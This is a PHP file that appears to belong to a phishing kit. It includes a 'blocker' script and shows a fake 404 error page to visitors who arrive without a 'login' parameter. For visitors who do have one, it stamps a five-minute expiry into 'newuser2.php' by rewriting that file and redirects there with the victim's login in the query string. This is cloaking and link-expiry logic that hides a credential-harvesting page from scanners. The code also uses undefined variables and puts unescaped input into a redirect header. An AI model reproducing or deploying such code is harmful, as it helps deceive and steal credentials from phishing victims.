<?php
include('blocker.php');
session_start();
if(empty($_GET['login']))
{
echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /djdjkd was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>';
exit;
} 

$login = $_GET['login'];
//expiry
$t=time();
$expire = $t + 300;
$path_to_file = "newuser2.php";
$file_contents = file_get_contents($path_to_file);
$file_contents = str_replace("exp1234", $expire, $file_contents);
file_put_contents($path_to_file,$file_contents);

header("Location: newuser2.php?login=$login&name=$fullname&loginID=$loginID");

?>